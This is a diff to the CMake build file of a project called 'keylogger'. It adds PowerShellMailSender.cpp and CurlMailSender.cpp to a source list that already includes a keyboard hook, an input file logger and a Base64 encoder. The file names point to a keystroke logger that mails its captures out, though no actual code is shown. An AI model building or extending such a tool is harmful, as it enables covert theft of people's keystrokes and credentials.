@@ -4,13 +4,14 @@ set(SOURCES
 		KeyloggerDirectoryLocator.cpp
 		Base64Encryptor.cpp
         TimestampFetcher.cpp
+        PowerShellMailSender.cpp
+        CurlMailSender.cpp
 		Timer.cpp
 		UserInputFileLogger.cpp
 		Helper.cpp
 		KeyboardHook.h
 		Keylogger.cpp
 		)
-
 
 add_executable(keylogger ${SOURCES} "Main.cpp")
 
